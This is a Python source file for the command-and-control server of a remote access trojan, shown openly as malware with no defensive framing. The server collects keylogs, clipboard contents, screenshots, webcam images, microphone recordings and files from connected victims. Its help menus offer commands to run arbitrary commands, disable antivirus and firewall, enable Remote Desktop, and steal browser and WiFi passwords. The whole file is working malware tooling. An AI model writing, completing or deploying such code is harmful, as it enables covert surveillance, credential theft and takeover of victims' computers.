import socket
import threading
import json
import base64
import os
import time
from datetime import datetime

class RATServer:
    def __init__(self, host='0.0.0.0', port=8888):
        self.host = host
        self.port = port
        self.clients = {}
        self.running = False
        self.server_socket = None
        
    def start(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(5)
        self.running = True
        
        print(f"Server started on {self.host}:{self.port}")
        
        # Start accepting connections
        accept_thread = threading.Thread(target=self.accept_connections)
        accept_thread.start()
        
        # Start command interface
        self.command_interface()
    
    def stop(self):
        self.running = False
        
        # Close all client connections
        for client_id, client_info in self.clients.items():
            client_info['socket'].close()
        
        # Close server socket
        if self.server_socket:
            self.server_socket.close()
        
        print("Server stopped")
    
    def accept_connections(self):
        while self.running:
            try:
                client_socket, client_address = self.server_socket.accept()
                client_id = f"{client_address[0]}:{client_address[1]}_{int(time.time())}"
                
                # Add client to list
                self.clients[client_id] = {
                    'socket': client_socket,
                    'address': client_address,
                    'connected_at': datetime.now(),
                    'last_heartbeat': datetime.now()
                }
                
                print(f"New client connected: {client_id}")
                
                # Start client handler thread
                client_thread = threading.Thread(target=self.handle_client, args=(client_id,))
                client_thread.start()
                
            except Exception as e:
                if self.running:
                    print(f"Error accepting connection: {e}")
    
    def handle_client(self, client_id):
        client_info = self.clients[client_id]
        client_socket = client_info['socket']
        
        while self.running:
            try:
                # Receive data
                data = client_socket.recv(4096)
                if not data:
                    break
                
                # Decrypt data (simple XOR)
                decrypted = self.xor_decrypt(data, "RAT_KEY_2023_SECURE")
                
                # Process data
                self.process_client_data(client_id, decrypted.decode('utf-8'))
                
            except Exception as e:
                print(f"Error handling client {client_id}: {e}")
                break
        
        # Remove client
        if client_id in self.clients:
            del self.clients[client_id]
            client_socket.close()
            print(f"Client disconnected: {client_id}")
    
    def process_client_data(self, client_id, data):
        client_info = self.clients[client_id]
        
        # Update heartbeat
        client_info['last_heartbeat'] = datetime.now()
        
        # Process different data types
        if data.startswith("HEARTBEAT"):
            print(f"Heartbeat from {client_id}")
        
        elif data.startswith("KEYLOG:"):
            keylog = data[7:]
            print(f"Keylog from {client_id}: {keylog}")
            # Save to file
            with open(f"keylogs_{client_id.replace(':', '_')}.txt", "a") as f:
                f.write(f"{datetime.now()}: {keylog}\n")
        
        elif data.startswith("CLIPBOARD:"):
            clipboard = data[10:]
            print(f"Clipboard from {client_id}: {clipboard}")
            # Save to file
            with open(f"clipboard_{client_id.replace(':', '_')}.txt", "a") as f:
                f.write(f"{datetime.now()}: {clipboard}\n")
        
        elif data.startswith("SCREENSHOT:"):
            screenshot_data = data[11:]
            # Decode base64
            try:
                screenshot_bytes = base64.b64decode(screenshot_data)
                # Save to file
                with open(f"screenshot_{client_id.replace(':', '_')}_{int(time.time())}.bmp", "wb") as f:
                    f.write(screenshot_bytes)
                print(f"Screenshot saved from {client_id}")
            except Exception as e:
                print(f"Error saving screenshot: {e}")
        
        elif data.startswith("WEBCAM:"):
            webcam_data = data[7:]
            # Decode base64
            try:
                webcam_bytes = base64.b64decode(webcam_data)
                # Save to file
                with open(f"webcam_{client_id.replace(':', '_')}_{int(time.time())}.jpg", "wb") as f:
                    f.write(webcam_bytes)
                print(f"Webcam capture saved from {client_id}")
            except Exception as e:
                print(f"Error saving webcam capture: {e}")
        
        elif data.startswith("MIC:"):
            mic_data = data[4:]
            # Decode base64
            try:
                mic_bytes = base64.b64decode(mic_data)
                # Save to file
                with open(f"mic_{client_id.replace(':', '_')}_{int(time.time())}.wav", "wb") as f:
                    f.write(mic_bytes)
                print(f"Microphone recording saved from {client_id}")
            except Exception as e:
                print(f"Error saving microphone recording: {e}")
        
        elif data.startswith("FILE:"):
            # Parse file data
            parts = data.split(":", 3)
            if len(parts) >= 3:
                file_path = parts[1]
                file_content = parts[2]
                # Save to file
                try:
                    with open(f"uploads_{client_id.replace(':', '_')}_{os.path.basename(file_path)}", "wb") as f:
                        f.write(file_content.encode('latin-1'))
                    print(f"File uploaded from {client_id}: {file_path}")
                except Exception as e:
                    print(f"Error saving uploaded file: {e}")
        
        else:
            # Print other data
            print(f"Data from {client_id}: {data}")
    
    def xor_decrypt(self, data, key):
        result = bytearray(data)
        for i in range(len(result)):
            result[i] ^= ord(key[i % len(key)])
        return result
    
    def xor_encrypt(self, data, key):
        result = bytearray(data, 'utf-8')
        for i in range(len(result)):
            result[i] ^= ord(key[i % len(key)])
        return result
    
    def send_command(self, client_id, command):
        if client_id not in self.clients:
            print(f"Client {client_id} not found")
            return False
        
        try:
            client_socket = self.clients[client_id]['socket']
            encrypted = self.xor_encrypt(command, "RAT_KEY_2023_SECURE")
            client_socket.send(encrypted)
            return True
        except Exception as e:
            print(f"Error sending command to {client_id}: {e}")
            return False
    
    def command_interface(self):
        while self.running:
            try:
                command = input("RAT> ")
                if not command:
                    continue
                
                parts = command.split()
                cmd = parts[0].lower()
                
                if cmd == "help":
                    self.show_help()
                
                elif cmd == "list":
                    self.list_clients()
                
                elif cmd == "select":
                    if len(parts) < 2:
                        print("Usage: select <client_id>")
                        continue
                    client_id = parts[1]
                    if client_id in self.clients:
                        self.interactive_client(client_id)
                    else:
                        print(f"Client {client_id} not found")
                
                elif cmd == "broadcast":
                    if len(parts) < 2:
                        print("Usage: broadcast <command>")
                        continue
                    broadcast_cmd = " ".join(parts[1:])
                    for client_id in self.clients:
                        self.send_command(client_id, broadcast_cmd)
                    print(f"Command sent to all clients")
                
                elif cmd == "exit":
                    self.stop()
                    break
                
                else:
                    print("Unknown command. Type 'help' for available commands.")
            
            except KeyboardInterrupt:
                self.stop()
                break
            except Exception as e:
                print(f"Error in command interface: {e}")
    
    def show_help(self):
        print("\nAvailable commands:")
        print("  help                 - Show this help message")
        print("  list                 - List all connected clients")
        print("  select <client_id>   - Select a client for interactive mode")
        print("  broadcast <command>  - Send command to all clients")
        print("  exit                 - Exit the server")
        print("\nClient commands:")
        print("  SYSINFO              - Get system information")
        print("  PROCLIST             - Get process list")
        print("  NETINFO              - Get network information")
        print("  SCREENSHOT           - Take a screenshot")
        print("  WEBCAM               - Capture from webcam")
        print("  MIC <duration>       - Record microphone (duration in seconds)")
        print("  EXEC <command>       - Execute a command")
        print("  DOWNLOAD <url> <path> - Download a file")
        print("  UPLOAD <path>        - Upload a file")
        print("  DELETE <path>        - Delete a file")
        print("  LIST <path>          - List directory contents")
        print("  START <path>         - Start a process")
        print("  KILL <pid>           - Kill a process")
        print("  DISABLEAV            - Disable antivirus")
        print("  DISABLEFW            - Disable firewall")
        print("  ENABLERDP            - Enable Remote Desktop")
        print("  PASSWORDS            - Get browser passwords")
        print("  WIFI                 - Get WiFi passwords")
        print("  EXIT                 - Terminate client")
    
    def list_clients(self):
        if not self.clients:
            print("No clients connected")
            return
        
        print("\nConnected clients:")
        print("ID\t\t\tAddress\t\tConnected at\t\tLast heartbeat")
        print("-" * 80)
        for client_id, client_info in self.clients.items():
            address = f"{client_info['address'][0]}:{client_info['address'][1]}"
            connected_at = client_info['connected_at'].strftime("%Y-%m-%d %H:%M:%S")
            last_heartbeat = client_info['last_heartbeat'].strftime("%Y-%m-%d %H:%M:%S")
            print(f"{client_id}\t{address}\t{connected_at}\t{last_heartbeat}")
    
    def interactive_client(self, client_id):
        print(f"\nInteractive mode with client {client_id}")
        print("Type 'back' to return to main menu, 'help' for client commands")
        
        while self.running:
            try:
                command = input(f"{client_id}> ")
                if not command:
                    continue
                
                if command.lower() == "back":
                    break
                
                if command.lower() == "help":
                    self.show_client_help()
                    continue
                
                if self.send_command(client_id, command):
                    print(f"Command sent to {client_id}")
                else:
                    print(f"Failed to send command to {client_id}")
            
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"Error in interactive mode: {e}")
    
    def show_client_help(self):
        print("\nAvailable client commands:")
        print("  SYSINFO              - Get system information")
        print("  PROCLIST             - Get process list")
        print("  NETINFO              - Get network information")
        print("  SCREENSHOT           - Take a screenshot")
        print("  WEBCAM               - Capture from webcam")
        print("  MIC <duration>       - Record microphone (duration in seconds)")
        print("  EXEC <command>       - Execute a command")
        print("  DOWNLOAD <url> <path> - Download a file")
        print("  UPLOAD <path>        - Upload a file")
        print("  DELETE <path>        - Delete a file")
        print("  LIST <path>          - List directory contents")
        print("  START <path>         - Start a process")
        print("  KILL <pid>           - Kill a process")
        print("  DISABLEAV            - Disable antivirus")
        print("  DISABLEFW            - Disable firewall")
        print("  ENABLERDP            - Enable Remote Desktop")
        print("  PASSWORDS            - Get browser passwords")
        print("  WIFI                 - Get WiFi passwords")
        print("  EXIT                 - Terminate client")

if __name__ == "__main__":
    server = RATServer()
    try:
        server.start()
    except KeyboardInterrupt:
        server.stop()
